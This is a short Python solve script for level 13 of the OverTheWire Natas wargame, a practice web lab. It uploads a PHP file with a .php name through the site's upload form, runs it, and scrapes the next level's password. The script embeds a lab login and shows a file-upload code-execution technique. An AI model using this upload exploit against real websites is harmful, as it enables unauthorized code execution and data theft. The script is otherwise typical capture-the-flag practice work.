import requests
import re

username = "natas13"
password = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

# Check the natas12_pass.php file for more info. Also you need to send the file as bytes so that's why it is "rb". Also there is a pic related for this challenge
response = session.post(url,files = {"uploadedfile": open("natas13_pass.php", "rb")}, data = {"filename": "natas13_pass.php" }, auth=(username,password))
print(response.text)
print("="*50)

# Just Code Printing
path = re.findall('href="upload/(.*).php"', response.text)[0]
new_url = url + "/upload/" + path + ".php"
response = session.get(new_url,auth=(username,password))
print("\nThe password for the next level is: " + re.findall(r"[a-zA-Z0-9]{32}",response.text)[0])